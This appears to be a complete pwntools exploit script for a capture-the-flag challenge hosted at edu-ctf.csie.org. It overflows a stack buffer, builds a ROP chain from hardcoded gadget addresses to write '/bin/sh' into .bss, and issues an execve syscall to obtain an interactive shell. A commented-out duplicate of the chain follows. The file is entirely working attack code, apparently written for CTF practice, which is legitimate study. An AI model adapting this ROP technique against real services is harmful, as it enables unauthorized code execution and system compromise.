from pwn import *
context.arch = "amd64"
context.os= "linux"

y = remote('edu-ctf.csie.org', 10173)

pop_rax = 0x0000000000415714
pop_rdi = 0x0000000000400686
pop_rsi = 0x00000000004100f3
pop_rdx = 0x0000000000449935
pop_rdx_rsi = 0x000000000044beb9

mov_q_rdi_rsi = 0x000000000044709b
syscall = 0x000000000047b68f

bss = 0x6b6030

p = 'a' * ( 0x30+8 )
p += p64( pop_rdi )
p += p64( bss )

p += p64( pop_rsi )
p += "/bin/sh\0"

p += p64( mov_q_rdi_rsi )

p +=  p64( pop_rdx_rsi )
p += p64(0)
p += p64(0)

p += p64( pop_rax )
p += p64( 0x3b )

p += p64( syscall )

y.sendlineafter( ':D', p)
y.interactive()


'''
p = flat(
	'a'*0x38,
	pop_rdi,
	bss, 
	pop_rsi,
	"/bin/sh\0",
	mov_q_rdi_rsi,
	pop_rsi,
	0,
	pop_rsi,
	0,
	pop_rax,
	0x3b,
	syscall
)
'''
